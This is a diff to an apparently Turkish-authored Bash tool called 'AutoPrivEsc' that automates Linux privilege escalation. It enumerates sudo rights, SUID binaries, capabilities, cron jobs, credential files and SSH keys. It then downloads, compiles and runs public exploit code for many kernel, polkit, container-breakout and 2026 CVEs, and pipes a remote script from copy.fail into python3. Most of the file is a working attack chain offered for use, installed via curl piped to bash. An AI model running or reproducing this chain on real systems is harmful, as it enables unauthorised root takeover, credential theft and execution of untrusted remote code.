@@ -1,7 +1,7 @@
 #!/bin/bash
 # ============================================
 # Thiscitze AutoPrivEsc - Scan -> Match -> Exploit
-# Kullanim: curl -fsSL <RAW_URL> | bash
+# Kullanim: curl -fsSL <RAW_URL> | bash [flags]
 # ============================================
 
 RED='\033[0;31m'
@@ -9,6 +9,30 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 CYAN='\033[0;36m'
 NC='\033[0m'
+
+# ===== ARGS =====
+QUIET=0
+CLEANUP=0
+NO_COPYFAIL=0
+DO_SCAN=0
+DO_SCAN_ONLY=0
+for A in "$@"; do
+    case "$A" in
+        -q|--quiet) QUIET=1 ;;
+        --cleanup) CLEANUP=1 ;;
+        --no-copyfail) NO_COPYFAIL=1 ;;
+        --scan) DO_SCAN=1 ;;
+        --scan-only) DO_SCAN=1; DO_SCAN_ONLY=1 ;;
+        -h|--help)
+            echo "Usage: $0 [flags]"
+            echo "  --scan         run read-only enumeration, then all exploits"
+            echo "  --scan-only    run enumeration only (no exploits, no traces)"
+            echo "  -q --quiet     compact output"
+            echo "  --cleanup      remove workdir when done"
+            echo "  --no-copyfail  skip the copy.fail payload"
+            exit 0 ;;
+    esac
+done
 
 # ===== TOOLS =====
 NEED="curl python3"
@@ -47,6 +71,8 @@ CPU=$(grep "model name" /proc/cpuinfo | head -1 | cut -d: -f2)
 HOSTNAME=$(hostname)
 KERNEL_MAJ=$(echo $KERNEL | cut -d. -f1)
 KERNEL_MIN=$(echo $KERNEL | cut -d. -f2)
+GLIBC=$(ldd --version 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+' | head -1)
+[ -z "$GLIBC" ] && GLIBC="unknown"
 
 echo -e "${CYAN}[SYSTEM]${NC}"
 echo "  Kernel : $KERNEL"
@@ -54,12 +80,24 @@ echo "  OS     : $OS $OS_VER"
 echo "  Arch   : $ARCH"
 echo "  CPU    :$CPU"
 echo "  Host   : $HOSTNAME"
+echo "  GLibc  : $GLIBC"
 echo ""
 
 # ===== ROOT CHECK =====
 if [ "$(id -u)" = "0" ]; then
     echo -e "${GREEN}[+] Already root. Nothing to do.${NC}"
     exit 0
+fi
+
+# ===== NETWORK CHECK =====
+NET_OK=1
+if [ "$HAS_TIMEOUT" = "1" ]; then
+    timeout 8 curl -fsSI https://github.com -o /dev/null 2>/dev/null || NET_OK=0
+else
+    NET_OK=1
+fi
+if [ "$NET_OK" = "0" ]; then
+    echo -e "${YELLOW}[-] no outbound network - downloads will fail, local checks only${NC}"
 fi
 
 # ===== HELPERS =====
@@ -86,8 +124,10 @@ find_workdir() {
 
 WRK=$(find_workdir) || { echo -e "${RED}[-] no writable+executable dir found${NC}"; exit 1; }
 LOGFILE=$WRK/exploit.log
+SUM=$WRK/summary.txt
 mkdir -p "$WRK"
 : > "$LOGFILE"
+: > "$SUM"
 cd "$WRK"
 echo -e "${CYAN}[WORKDIR] $WRK${NC}"
 echo ""
@@ -101,8 +141,10 @@ kcfg() {
 fetch_repo() {
     local repo="$1" dir="$2"
     rm -rf "$dir" "$dir.tgz"
-    if GIT_TERMINAL_PROMPT=0 git clone -q --depth 1 "https://github.com/$repo.git" "$dir" 2>/dev/null; then
-        return 0
+    if [ "$HAS_GIT" = "1" ]; then
+        if GIT_TERMINAL_PROMPT=0 git clone -q --depth 1 "https://github.com/$repo.git" "$dir" 2>/dev/null; then
+            return 0
+        fi
     fi
     if curl -fsSL "https://codeload.github.com/$repo/tar.gz/refs/heads/main" -o "$dir.tgz" 2>/dev/null; then
         mkdir -p "$dir" && tar xzf "$dir.tgz" -C "$dir" --strip-components=1 2>/dev/null && rm -f "$dir.tgz"
@@ -111,7 +153,27 @@ fetch_repo() {
     return 1
 }
 
+# --- kernel version compare ---
+knum() { echo "$1" | awk -F. '{printf "%d%02d", $1, $2}'; }
+KCUR=$(knum "$KERNEL")
+in_krange() { # "5.8-5.16" or "*"
+    local r="$1"
+    [ "$r" = "*" ] && return 0
+    local lo="${r%%-*}" hi="${r##*-}"
+    local nlo=$(knum "$lo") nhi=$(knum "$hi")
+    [ "$KCUR" -ge "$nlo" ] && [ "$KCUR" -le "$nhi" ]
+}
+glibc_ge() { # compare against GLIBC var
+    local need=$(echo "$1" | awk -F. '{printf "%d%02d", $1, $2}')
+    local have=$(echo "$GLIBC" | awk -F. '{printf "%d%02d", $1, $2}')
+    [ "$have" -ge "$need" ]
+}
+
+warn() { echo -e "${YELLOW}[!] $*${NC}"; }
+note() { echo -e "${GREEN}[+] $*${NC}"; }
+
 got_root() {
+    local who="$1"
     echo -e "${RED}"
     echo "  ██████╗  ██████╗  ██████╗ ████████╗     ██████╗  ██████╗ ████████╗ ██████╗ "
     echo "  ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝    ██╔═══██╗██╔═══██╗╚══██╔══╝██╔═══██╗"
@@ -120,26 +182,28 @@ got_root() {
     echo "  ██║  ██║╚██████╔╝╚██████╔╝   ██║       ╚██████╔╝╚██████╔╝   ██║   ╚██████╔╝"
     echo "  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝        ╚═════╝  ╚═════╝    ╚═╝    ╚═════╝ "
     echo -e "${NC}"
-    echo -e "${GREEN}[+] UID: $(id -u)  EUID: $(id -u)${NC}"
+    echo -e "${GREEN}[+] UID: $(id -u)  EUID: $(id -u)  via: $who${NC}"
     id
     echo ""
     echo -e "${GREEN}[+] ROOT! Stopping. Clean up: rm -rf $WRK${NC}"
+    [ "$CLEANUP" = "1" ] && rm -rf "$WRK"
     exit 0
 }
 
 run() {
-    echo -e "${CYAN}[>] Trying: $1${NC}"
-    echo "==== $1 ====" >> $LOGFILE
+    local cmd="$1" name="${2:-$1}"
+    echo -e "${CYAN}[>] Trying: $name${NC}"
+    echo "==== $name :: $cmd ====" >> $LOGFILE
     local OUT=$WRK/.out.$$
     if [ "$HAS_TIMEOUT" = "1" ] && command -v setsid >/dev/null 2>&1; then
-        setsid bash -c "$1" </dev/null >"$OUT" 2>&1 &
+        setsid bash -c "$cmd" </dev/null >"$OUT" 2>&1 &
         local PID=$!
         local S=0
         while kill -0 $PID 2>/dev/null && [ $S -lt 90 ]; do
             sleep 1; S=$((S+1))
         done
         if kill -0 $PID 2>/dev/null; then
-            echo -e "${YELLOW}    [timeout] killing process group...${NC}"
+            [ "$QUIET" = "0" ] && echo -e "${YELLOW}    [timeout] killing process group...${NC}"
             kill -- -$PID 2>/dev/null
             sleep 2
             kill -9 -- -$PID 2>/dev/null
@@ -149,19 +213,86 @@ run() {
             RC=$?
         fi
     else
-        timeout -k 5 90 bash -c "$1" </dev/null >"$OUT" 2>&1
+        timeout -k 5 90 bash -c "$cmd" </dev/null >"$OUT" 2>&1
         RC=$?
     fi
-    sed 's/^/    /' "$OUT" | tee -a $LOGFILE
+    if [ "$QUIET" = "0" ]; then
+        sed 's/^/    /' "$OUT" | tee -a $LOGFILE
+    else
+        cat "$OUT" >> $LOGFILE
+    fi
     rm -f "$OUT"
     if [ "$(id -u)" = "0" ]; then
-        echo -e "${GREEN}[+] SUCCESS via: $1${NC}"
-        got_root "$1"
+        echo "$name|OK|root" >> $SUM
+        echo -e "${GREEN}[+] SUCCESS via: $name${NC}"
+        got_root "$name"
     else
+        echo "$name|FAIL|exit=$RC" >> $SUM
         echo -e "${YELLOW}[-] no root (exit code: $RC)${NC}"
         echo ""
     fi
 }
+
+# ===== ENUMERATION (read-only) =====
+enum_scan() {
+    echo -e "${CYAN}===== ENUMERATION =====${NC}"
+    echo ""
+    echo -e "${CYAN}[USERS/GROUPS]${NC}"
+    id
+    echo ""
+    echo -e "${CYAN}[SUDO]${NC}"
+    if sudo -n -l 2>/dev/null | grep -qE "NOPASSWD|\(ALL"; then
+        note "sudo available without password:"
+        sudo -n -l 2>/dev/null
+    else
+        warn "no NOPASSWD sudo (or password required)"
+    fi
+    echo ""
+    echo -e "${CYAN}[SUID]${NC}"
+    find / -perm -4000 -type f 2>/dev/null | while read -r f; do echo "  $f"; done
+    echo ""
+    echo -e "${CYAN}[CAPABILITIES]${NC}"
+    getcap -r / 2>/dev/null | grep -v '^/dev' | while read -r l; do echo "  $l"; done
+    echo ""
+    echo -e "${CYAN}[WRITABLE PATH]${NC}"
+    IFS=: read -ra PATHS <<< "$PATH"
+    for d in "${PATHS[@]}"; do
+        [ -d "$d" ] && [ -w "$d" ] && echo "  $d"
+    done
+    echo ""
+    echo -e "${CYAN}[CRON]${NC}"
+    ls -la /etc/cron.d /etc/cron.daily 2>/dev/null | while read -r l; do echo "  $l"; done
+    grep -rE "^\S+\s+\S+\s+\S+\s+\S+\s+\S+\s+\S+" /etc/crontab 2>/dev/null | while read -r l; do echo "  $l"; done
+    echo ""
+    echo -e "${CYAN}[PASSWD]${NC}"
+    [ -w /etc/passwd ] && note "/etc/passwd is writable!" || warn "/etc/passwd not writable"
+    echo ""
+    echo -e "${CYAN}[CREDENTIALS]${NC}"
+    grep -rliE "password|secret|api[_-]?key" /home/*/.* 2>/dev/null | head -10 | while read -r f; do echo "  $f"; done
+    ls -la /home/*/.ssh 2>/dev/null | while read -r l; do echo "  $l"; done
+    echo ""
+    echo -e "${CYAN}[CONTAINER]${NC}"
+    if [ -f /.dockerenv ] || grep -qE "docker|kubepods|lxc" /proc/1/cgroup 2>/dev/null; then
+        note "running inside a container"
+    else
+        warn "not a container"
+    fi
+    echo ""
+    echo -e "${CYAN}[KERNEL MATCH]${NC}"
+    for r in "5.8-5.16" "5.14-6.99" "6.1-6.6" "5.19-6.8" "5.10-5.17"; do
+        in_krange "$r" && echo "  kernel in range $r"
+    done
+    echo ""
+}
+
+if [ "$DO_SCAN" = "1" ]; then
+    enum_scan
+    if [ "$DO_SCAN_ONLY" = "1" ]; then
+        echo -e "${GREEN}[+] enumeration done (no exploits run)${NC}"
+        [ "$CLEANUP" = "1" ] && rm -rf "$WRK"
+        exit 0
+    fi
+fi
 
 # ===== TARGETS =====
 echo -e "${CYAN}[CHECKING EXPLOIT TARGETS]${NC}"
@@ -169,149 +300,158 @@ echo ""
 
 # --- PwnKit (CVE-2021-4034) ---
 if [ "$HAS_GCC" = "1" ] && ( [ -x "$(command -v pkexec 2>/dev/null)" ] || [ -f "/usr/bin/pkexec" ] ); then
-    echo -e "${GREEN}[+] pkexec found${NC} -> CVE-2021-4034 (PwnKit)"
-    run "curl -fsSL https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/refs/heads/main/cve-2021-4034-poc.c -o pwn.c && gcc pwn.c -o pwn && ./pwn"
+    note "pkexec found -> CVE-2021-4034 (PwnKit)"
+    run "curl -fsSL https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/refs/heads/main/cve-2021-4034-poc.c -o pwn.c && gcc pwn.c -o pwn && ./pwn" "PwnKit"
+else
+    [ "$HAS_GCC" = "0" ] && warn "skip PwnKit (no gcc)"
 fi
 
 # --- PwnKit alt (Rvn0xsy) ---
 if [ "$HAS_GCC" = "1" ] && ( [ -x "$(command -v pkexec 2>/dev/null)" ] || [ -f "/usr/bin/pkexec" ] ); then
-    echo -e "${GREEN}[+] pkexec found${NC} -> CVE-2021-4034 (alt POC)"
-    fetch_repo Rvn0xsy/CVE-2021-4034 rvn && run "cd rvn && gcc cve-2021-4034.c -o exp && ./exp"
+    note "pkexec found -> CVE-2021-4034 (alt POC)"
+    fetch_repo Rvn0xsy/CVE-2021-4034 rvn && run "cd rvn && gcc cve-2021-4034.c -o exp && ./exp" "PwnKit-alt"
 fi
 
 # --- Dirty Pipe (CVE-2022-0847) ---
-if [ "$HAS_GCC" = "1" ] && [ "$KERNEL_MAJ" = "5" ] && [ "$KERNEL_MIN" -ge 8 ] && [ "$KERNEL_MIN" -le 16 ]; then
-    echo -e "${GREEN}[+] Kernel 5.$KERNEL_MIN ${NC}-> CVE-2022-0847 (Dirty Pipe)"
-    fetch_repo Arinerron/CVE-2022-0847-DirtyPipe-Exploit dp && run "cd dp && gcc exploit.c -o exploit && ./exploit"
+in_krange "5.8-5.16" || warn "Dirty Pipe: kernel out of range (5.8-5.16), trying anyway"
+if [ "$HAS_GCC" = "1" ]; then
+    fetch_repo Arinerron/CVE-2022-0847-DirtyPipe-Exploit dp && run "cd dp && gcc exploit.c -o exploit && ./exploit" "Dirty Pipe"
 fi
 
 # --- GameOver(lay) (CVE-2023-2640 + CVE-2023-32629) ---
 if [ "$OS" = "ubuntu" ] && ( lsmod 2>/dev/null | grep -q overlay || [ -d "/sys/module/overlay" ] ); then
-    echo -e "${GREEN}[+] Ubuntu + OverlayFS${NC} -> CVE-2023-2640 + CVE-2023-32629"
-    run "curl -fsSL https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh -o gameover.sh && chmod +x gameover.sh && bash gameover.sh"
+    note "Ubuntu + OverlayFS -> CVE-2023-2640 + CVE-2023-32629"
+    run "curl -fsSL https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh -o gameover.sh && chmod +x gameover.sh && bash gameover.sh" "GameOverlay"
 fi
 
 # --- DirtyCred ---
-if [ "$HAS_GCC" = "1" ] && ( ( [ "$KERNEL_MAJ" = "5" ] && [ "$KERNEL_MIN" -ge 14 ] ) || [ "$KERNEL_MAJ" = "6" ] ); then
-    echo -e "${GREEN}[+] Kernel 5.14-6.x ${NC}-> DirtyCred"
-    fetch_repo PR0fix/DirtyCred dc && run "cd dc && make && ./exploit"
+in_krange "5.14-6.99" || warn "DirtyCred: kernel out of range (5.14-6.x), trying anyway"
+if [ "$HAS_GCC" = "1" ]; then
+    fetch_repo PR0fix/DirtyCred dc && run "cd dc && make && ./exploit" "DirtyCred"
 fi
 
 # --- DirtyFrag ---
-if [ "$HAS_GCC" = "1" ] && [ "$KERNEL_MAJ" = "6" ] && [ "$KERNEL_MIN" -ge 1 ] && [ "$KERNEL_MIN" -le 6 ]; then
-    echo -e "${GREEN}[+] Kernel 6.$KERNEL_MIN ${NC}-> DirtyFrag"
-    fetch_repo V4bel/dirtyfrag df && run "cd df && gcc -O0 -Wall -o exp exp.c -lutil && ./exp"
+in_krange "6.1-6.6" || warn "DirtyFrag: kernel out of range (6.1-6.6), trying anyway"
+if [ "$HAS_GCC" = "1" ]; then
+    fetch_repo V4bel/dirtyfrag df && run "cd df && gcc -O0 -Wall -o exp exp.c -lutil && ./exp" "DirtyFrag"
 fi
 
 # --- FragNesia ---
-if [ "$HAS_GCC" = "1" ] && ( [ "$KERNEL_MAJ" = "5" ] && [ "$KERNEL_MIN" -ge 19 ] || [ "$KERNEL_MAJ" = "6" ] && [ "$KERNEL_MIN" -le 8 ] ); then
-    echo -e "${GREEN}[+] Kernel 5.19-6.8 ${NC}-> FragNesia"
-    fetch_repo v12-security/pocs pocs && run "cd pocs/fragnesia && gcc -o exp fragnesia.c && ./exp"
+in_krange "5.19-6.8" || warn "FragNesia: kernel out of range (5.19-6.8), trying anyway"
+if [ "$HAS_GCC" = "1" ]; then
+    fetch_repo v12-security/pocs pocs && run "cd pocs/fragnesia && gcc -o exp fragnesia.c && ./exp" "FragNesia"
 fi
 
 # --- eBPF Ring Buffer / Verifier LPE ---
 if [ "$HAS_GCC" = "1" ] && kcfg CONFIG_BPF_SYSCALL && kcfg CONFIG_BPF && kcfg CONFIG_USER_NS; then
-    echo -e "${YELLOW}[~] eBPF enabled${NC} -> eBPF LPE"
-    fetch_repo argonsecurity/ebpf-lpe-poc ebpf && run "cd ebpf && make && ./exploit"
+    note "eBPF enabled -> eBPF LPE"
+    fetch_repo argonsecurity/ebpf-lpe-poc ebpf && run "cd ebpf && make && ./exploit" "eBPF-LPE"
 else
-    echo -e "${YELLOW}[-] skip eBPF (no gcc / BPF disabled)${NC}"
+    [ "$HAS_GCC" = "0" ] && warn "skip eBPF (no gcc)" || warn "skip eBPF (BPF/user-ns disabled)"
 fi
 
 # --- Netfilter / nf_tables (CVE-2023-32233) ---
 if [ "$HAS_GCC" = "1" ] && kcfg CONFIG_NF_TABLES; then
-    echo -e "${YELLOW}[~] nftables enabled${NC} -> CVE-2023-32233"
-    fetch_repo bluefrostsecurity/CVE-2023-32233-PoC nft && run "cd nft && gcc -O2 exploit.c -o exploit -lnftables && ./exploit"
+    note "nftables enabled -> CVE-2023-32233"
+    fetch_repo bluefrostsecurity/CVE-2023-32233-PoC nft && run "cd nft && gcc -O2 exploit.c -o exploit -lnftables && ./exploit" "nftables-32233"
 else
-    echo -e "${YELLOW}[-] skip nftables (no gcc / CONFIG_NF_TABLES disabled)${NC}"
+    [ "$HAS_GCC" = "0" ] && warn "skip nftables (no gcc)" || warn "skip nftables (CONFIG_NF_TABLES disabled)"
 fi
 
 # --- SLUB Overflow (CVE-2022-29582) ---
-if [ "$HAS_GCC" = "1" ] && [ "$KERNEL_MAJ" = "5" ] && [ "$KERNEL_MIN" -ge 10 ] && [ "$KERNEL_MIN" -le 17 ]; then
-    echo -e "${GREEN}[+] Kernel 5.$KERNEL_MIN ${NC}-> CVE-2022-29582 (SLUB)"
-    fetch_repo Bonfee/CVE-2022-29582 slub && run "cd slub && gcc -O2 exploit.c -o exploit && ./exploit"
+in_krange "5.10-5.17" || warn "SLUB: kernel out of range (5.10-5.17), trying anyway"
+if [ "$HAS_GCC" = "1" ]; then
+    fetch_repo Bonfee/CVE-2022-29582 slub && run "cd slub && gcc -O2 exploit.c -o exploit && ./exploit" "SLUB-29582"
 fi
 
 # --- io_uring UAF ---
 if [ "$HAS_GCC" = "1" ] && kcfg CONFIG_IO_URING; then
-    echo -e "${YELLOW}[~] io_uring enabled${NC} -> io_uring LPE"
-    fetch_repo kxcode/iouring-exploit-poc iou && run "cd iou && gcc -O2 exploit.c -o exploit -lpthread && ./exploit"
+    note "io_uring enabled -> io_uring LPE"
+    fetch_repo kxcode/iouring-exploit-poc iou && run "cd iou && gcc -O2 exploit.c -o exploit -lpthread && ./exploit" "io_uring"
 else
-    echo -e "${YELLOW}[-] skip io_uring (no gcc / CONFIG_IO_URING disabled)${NC}"
+    [ "$HAS_GCC" = "0" ] && warn "skip io_uring (no gcc)" || warn "skip io_uring (CONFIG_IO_URING disabled)"
 fi
 
 # --- TONTOU (Spectre v2 bypass, AMD Zen 2) ---
-if [ "$HAS_GCC" = "1" ] && echo "$CPU" | grep -qi "AMD.*Zen.2\|AMD.*Ryzen.*3[0-9]\|AMD.*EPYC.*7[0-9]"; then
-    echo -e "${YELLOW}[~] AMD Zen 2${NC} -> TONTOU"
-    run "curl -fsSL https://github.com/CSAIL-Arch-Sec/tontou/archive/refs/heads/main.zip -o tontou.zip && unzip -oq tontou.zip && cd tontou-main && make && ./tontou"
+if echo "$CPU" | grep -qi "AMD.*Zen.2\|AMD.*Ryzen.*3[0-9]\|AMD.*EPYC.*7[0-9]"; then
+    note "AMD Zen 2 -> TONTOU"
+    run "curl -fsSL https://github.com/CSAIL-Arch-Sec/tontou/archive/refs/heads/main.zip -o tontou.zip && unzip -oq tontou.zip && cd tontou-main && make && ./tontou" "TONTOU"
+else
+    warn "skip TONTOU (not AMD Zen 2)"
 fi
 
 # --- CVE-2026-46215 ---
-if [ "$HAS_GCC" = "1" ] && [ "$KERNEL_MAJ" -ge 7 ] 2>/dev/null; then
-    echo -e "${YELLOW}[~] Kernel $KERNEL.x${NC} -> CVE-2026-46215"
-    fetch_repo bluedragonsecurity/CVE-2026-46215-exploit-linux-7.0-uaf-stable c46215 && run "cd c46215 && gcc -o exploit exploit.c -lpthread -static && ./exploit"
+[ "$KERNEL_MAJ" -ge 7 ] 2>/dev/null || warn "CVE-2026-46215: needs kernel >= 7, trying anyway"
+if [ "$HAS_GCC" = "1" ]; then
+    fetch_repo bluedragonsecurity/CVE-2026-46215-exploit-linux-7.0-uaf-stable c46215 && run "cd c46215 && gcc -o exploit exploit.c -lpthread -static && ./exploit" "CVE-2026-46215"
 fi
 
 # --- PackageKit (CVE-2026-41651) ---
 if dpkg -l 2>/dev/null | grep -qi packagekit || rpm -qa 2>/dev/null | grep -qi PackageKit; then
-    echo -e "${GREEN}[+] PackageKit installed${NC} -> CVE-2026-41651"
-    fetch_repo Vozec/CVE-2026-41651 pk && run "cd pk && chmod +x cve-2026-41651 && ./cve-2026-41651"
+    note "PackageKit installed -> CVE-2026-41651"
+    glibc_ge 2.33 || warn "41651: glibc $GLIBC < 2.33 (binary needs GLIBC_2.33+), trying anyway"
+    fetch_repo Vozec/CVE-2026-41651 pk && run "cd pk && chmod +x cve-2026-41651 && ./cve-2026-41651" "CVE-2026-41651"
 fi
 
 # --- Polkit / DBus (CVE-2021-3560) ---
 if [ -f "/usr/bin/pkexec" ] || [ -f "/usr/bin/polkit-agent-helper-1" ]; then
-    echo -e "${GREEN}[+] Polkit present${NC} -> CVE-2021-3560"
-    fetch_repo cybersecurityworks/CVE-2021-3560-Exploit-POC p3560 && run "cd p3560 && python3 cve-2021-3560.py"
+    note "Polkit present -> CVE-2021-3560"
+    fetch_repo cybersecurityworks/CVE-2021-3560-Exploit-POC p3560 && run "cd p3560 && python3 cve-2021-3560.py" "CVE-2021-3560"
 fi
 
 # --- runc Container Breakout (CVE-2024-21626) ---
-if ls /proc/*/exe 2>/dev/null | grep -q .; then
-    echo -e "${YELLOW}[~] Container-like /proc detected${NC} -> runc breakout (CVE-2024-21626)"
-    fetch_repo snyk/CVE-2024-21626-PoC runc && run "cd runc && bash exploit.sh"
+if [ -f /.dockerenv ] || grep -qE "docker|kubepods|lxc" /proc/1/cgroup 2>/dev/null; then
+    note "container detected -> runc breakout (CVE-2024-21626)"
+    fetch_repo snyk/CVE-2024-21626-PoC runc && run "cd runc && bash exploit.sh" "runc-21626"
+else
+    warn "skip runc breakout (not a container)"
 fi
 
 # --- OVSwrap ---
 if lsmod 2>/dev/null | grep -q openvswitch || [ -d "/sys/module/openvswitch" ]; then
-    echo -e "${GREEN}[+] Open vSwitch loaded${NC} -> OVSwrap"
-    fetch_repo manizada/OVSwrap ovs && run "cd ovs && python3 ovswrap-poc.py"
+    note "Open vSwitch loaded -> OVSwrap"
+    fetch_repo manizada/OVSwrap ovs && run "cd ovs && python3 ovswrap-poc.py" "OVSwrap"
 fi
 
 # --- CVE-2026-31431 ---
 if [ "$HAS_UNZIP" = "1" ]; then
-    echo -e "${YELLOW}[~] Trying CVE-2026-31431${NC}"
-    run "curl -fsSL https://github.com/JuanBindez/CVE-2026-31431/archive/refs/heads/main.zip -o c31431.zip && unzip -oq c31431.zip && cd CVE-2026-31431-main && python3 main.py"
+    warn "CVE-2026-31431: unverified repo, trying anyway"
+    run "curl -fsSL https://github.com/JuanBindez/CVE-2026-31431/archive/refs/heads/main.zip -o c31431.zip && unzip -oq c31431.zip && cd CVE-2026-31431-main && python3 main.py" "CVE-2026-31431"
 fi
 
-# --- CVE-2026-46300 (hazir binary, derleme gerekmez) ---
-echo -e "${YELLOW}[~] Trying CVE-2026-46300${NC}"
-fetch_repo ExploitEoom/CVE-2026-46300 c46300 && run "cd c46300 && chmod +x exploit && ./exploit"
+# --- CVE-2026-46300 (hazir binary) ---
+warn "CVE-2026-46300: unverified binary, trying anyway"
+fetch_repo ExploitEoom/CVE-2026-46300 c46300 && run "cd c46300 && chmod +x exploit && ./exploit" "CVE-2026-46300"
 
 # --- CVE-2026-64600 ---
 if [ "$HAS_GCC" = "1" ]; then
-    echo -e "${YELLOW}[~] Trying CVE-2026-64600${NC}"
-    fetch_repo Debajyoti0-0/CVE-2026-64600 c64600 && run "cd c64600 && gcc -o cve-2026-64600 cve-2026-64600.c -lm -lpthread && ./cve-2026-64600"
+    warn "CVE-2026-64600: unverified repo, trying anyway"
+    fetch_repo Debajyoti0-0/CVE-2026-64600 c64600 && run "cd c64600 && gcc -o cve-2026-64600 cve-2026-64600.c -lm -lpthread && ./cve-2026-64600" "CVE-2026-64600"
 fi
 
 # --- CVE-2026-68138 ---
 if [ "$HAS_GCC" = "1" ]; then
-    echo -e "${YELLOW}[~] Trying CVE-2026-68138${NC}"
-    fetch_repo aramosf/CVE-2026-68138 c68138 && run "cd c68138 && bash build.sh && ./build/exploit"
+    warn "CVE-2026-68138: unverified repo, trying anyway"
+    fetch_repo aramosf/CVE-2026-68138 c68138 && run "cd c68138 && bash build.sh && ./build/exploit" "CVE-2026-68138"
 fi
 
 # --- CVE-2026-68398 (gcc) ---
 if [ "$HAS_GCC" = "1" ]; then
-    echo -e "${YELLOW}[~] Trying CVE-2026-68398 (gcc)${NC}"
-    fetch_repo aramosf/cve-2026-68398 c68398 && run "cd c68398 && gcc -O2 exploit.c kaslr_prefetch.c -o exploit -lpthread && ./exploit"
+    warn "CVE-2026-68398: expects 5.15.0-187-generic, current $KERNEL - trying anyway"
+    fetch_repo aramosf/cve-2026-68398 c68398 && run "cd c68398 && gcc -O2 exploit.c kaslr_prefetch.c -o exploit -lpthread && ./exploit" "CVE-2026-68398"
 fi
 
 # --- CVE-2026-68398 (make) ---
 if [ "$HAS_MAKE" = "1" ]; then
-    echo -e "${YELLOW}[~] Trying CVE-2026-68398 (make)${NC}"
-    fetch_repo aramosf/cve-2026-68398 c68398b && run "cd c68398b && make && ./build/CVE-2026-68398"
+    warn "CVE-2026-68398-make: expects 5.15.0-187-generic, current $KERNEL - trying anyway"
+    fetch_repo aramosf/cve-2026-68398 c68398b && run "cd c68398b && make && ./build/CVE-2026-68398" "CVE-2026-68398-make"
 fi
 
 # --- copy.fail exp ---
-echo -e "${YELLOW}[~] Trying copy.fail exp${NC}"
-run "curl https://copy.fail/exp | python3 && su"
+if [ "$NO_COPYFAIL" = "0" ]; then
+    warn "copy.fail: runs code from third-party URL (risky), trying anyway"
+    run "curl https://copy.fail/exp | python3 && su" "copy.fail"
+fi
 
 # ===== RESULT =====
 echo "================================================"
@@ -320,7 +460,24 @@ if [ "$(id -u)" = "0" ]; then
     id
 else
     echo -e "${RED}[-] All exploits failed. No root obtained.${NC}"
-    echo -e "${RED}[-] Full log: $LOGFILE${NC}"
-    echo -e "${YELLOW}[-] Common causes: hardened kernel (grsec), missing SUID, noexec workdir, patched kernel, fake repos${NC}"
-    echo -e "${YELLOW}[-] Clean up: rm -rf $WRK${NC}"
+fi
+echo ""
+echo -e "${CYAN}[SUMMARY]${NC}"
+if [ -s "$SUM" ]; then
+    while IFS='|' read -r n rs rr; do
+        case "$rs" in
+            OK)   echo -e "  ${GREEN}[OK]${NC}   $n";;
+            FAIL) echo -e "  ${RED}[FAIL]${NC} $n ($rr)";;
+        esac
+    done < "$SUM"
+else
+    echo "  (nothing was attempted)"
+fi
+echo ""
+echo -e "${YELLOW}[-] Full log: $LOGFILE${NC}"
+echo -e "${YELLOW}[-] Common causes: hardened kernel (grsec), missing SUID, noexec workdir, patched kernel, fake repos, unverified binaries${NC}"
+echo -e "${YELLOW}[-] Clean up: rm -rf $WRK${NC}"
+if [ "$CLEANUP" = "1" ]; then
+    rm -rf "$WRK"
+    echo -e "${GREEN}[+] workdir removed${NC}"
 fi
